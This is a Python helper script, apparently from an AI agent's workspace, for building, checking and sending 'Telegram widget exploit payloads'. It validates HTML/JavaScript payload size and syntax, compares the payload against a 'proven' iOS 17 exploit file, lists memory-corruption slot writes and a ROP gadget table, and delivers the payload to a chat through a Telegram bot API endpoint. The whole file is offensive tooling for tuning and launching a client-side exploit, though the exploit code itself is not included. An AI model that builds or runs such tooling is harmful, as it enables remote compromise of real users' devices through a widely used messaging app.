#!/usr/bin/env python3
"""Generate/validate Telegram widget exploit payloads.

Usage:
  python3 mkpayload.py validate <html>...
  python3 mkpayload.py dump <html>
  python3 mkpayload.py send <html> [caption]
  python3 mkpayload.py edit <src> <dst> old==>new [old==>new ...]
"""
import json
import os
import re
import subprocess
import sys
import urllib.request
import zlib
from pathlib import Path

REF = Path('/tmp/opencode/ios17_state_sf.html')
TOK = os.environ.get('BOT_TOKEN', '')
CHAT = 0


def read(p):
    return Path(p).read_text(encoding='utf-8', errors='replace')


def split(h):
    i = h.find('<script>')
    j = h.rfind('</script>')
    if i < 0 or j < 0:
        raise SystemExit('no <script> block')
    return h[:i + len('<script>')], h[i + len('<script>'):j], h[j:]


def wrapper_ok(h):
    if not REF.exists():
        return None
    a, b = split(read(REF)), split(h)
    return a[0] == b[0] and a[2] == b[2]


def js_check(js):
    p = Path('/tmp/opencode/_payload_check.js')
    p.write_text(js)
    r = subprocess.run(['node', '--check', str(p)], capture_output=True, text=True)
    return r.returncode == 0, (r.stderr or '').strip()


def calls(js, name):
    """Return [(offset_or_expr, value_text)] for name(Yf|cn, off, value)."""
    out = []
    pat = re.compile(r'\byn\(' + name + r',([^,]+),')
    for m in pat.finditer(js):
        off = m.group(1).strip()
        k = m.end()
        depth = 1
        val = []
        while k < len(js) and depth:
            c = js[k]
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
            if depth:
                val.append(c)
            k += 1
        out.append((off, ''.join(val).strip()))
    return out


def parse_off(off):
    if re.fullmatch(r'[0-9]+', off):
        return int(off)
    if re.fullmatch(r'[0-9]+e[0-9]+', off):
        return int(float(off))
    if re.fullmatch(r'0x[0-9a-fA-F]+', off):
        return int(off, 16)
    return off  # variable


def final_slots(js):
    """Map offset -> last value, with the write count."""
    d = {}
    for off, val in calls(js, 'Yf'):
        n = parse_off(off)
        d.setdefault(n, [])
        d[n].append(val)
    return d


def validate(p):
    h = read(p)
    pre, js, post = split(h)
    z = len(zlib.compress(h.encode('utf-8'), 9))
    ok_js, err = js_check(js)
    print('== %s' % p)
    print('  raw=%d zlib=%d (limit 32768/4096) %s' % (len(h), z, 'OK' if z <= 4096 and len(h) <= 32768 else 'TOO_BIG'))
    print('  wrapper_vs_proven=%s' % wrapper_ok(h))
    print('  js_syntax=%s%s' % ('OK' if ok_js else 'ERR', '' if ok_js else ' ' + err[:200]))
    print('  script_len=%d' % len(js))
    slots = final_slots(js)
    multi = {k: v for k, v in slots.items() if len(v) > 1}
    if multi:
        print('  WARNING multi-write slots:')
        for k, v in sorted(multi.items(), key=lambda x: (isinstance(x[0], str), x[0])):
            print('    [%s] -> %s' % (k, v))
    return {'raw': len(h), 'zlib': z, 'js_ok': ok_js, 'wrapper': wrapper_ok(h), 'script_len': len(js)}


def dump(p):
    h = read(p)
    pre, js, post = split(h)
    print('== %s (raw %d, zlib %d)' % (p, len(h), len(zlib.compress(h.encode('utf-8'), 9))))
    print('-- UB writes (Yf), final value per slot --')
    for k, v in sorted(final_slots(js).items(), key=lambda x: (isinstance(x[0], str), x[0])):
        print('  [%s] = %s%s' % (k, v[-1], '   (writes: %s)' % v if len(v) > 1 else ''))
    print('-- ROP table (cn) --')
    for off, val in calls(js, 'cn'):
        print('  0x%03x = %s' % (int(off, 0), val[:50]))


def send(p):
    h = read(p)
    body = json.dumps({'chat_id': CHAT, 'html': h}).encode()
    req = urllib.request.Request('https://api.telegram.org/beta/bot%s/sendWidget' % TOK,
                                 data=body, headers={'Content-Type': 'application/json'})
    d = json.load(urllib.request.urlopen(req, timeout=25))
    print('sent ok=%s mid=%s raw=%d zlib=%d' % (
        d.get('ok'), (d.get('result') or {}).get('message_id'),
        len(h), len(zlib.compress(h.encode('utf-8'), 9))))


def edit(src, dst, pairs):
    h = read(src)
    for pair in pairs:
        old, new = pair.split('==>', 1)
        c = h.count(old)
        if c != 1:
            raise SystemExit('edit: %r occurs %d times' % (old[:60], c))
        h = h.replace(old, new, 1)
    Path(dst).write_text(h)
    print('wrote %s (delta %d)' % (dst, len(h) - len(read(src))))
    validate(dst)


def main():
    if len(sys.argv) < 3:
        raise SystemExit(__doc__)
    cmd = sys.argv[1]
    if cmd == 'validate':
        for p in sys.argv[2:]:
            validate(p)
    elif cmd == 'dump':
        dump(sys.argv[2])
    elif cmd == 'send':
        send(sys.argv[2])
    elif cmd == 'edit':
        edit(sys.argv[2], sys.argv[3], sys.argv[4:])
    else:
        raise SystemExit(__doc__)


if __name__ == '__main__':
    main()
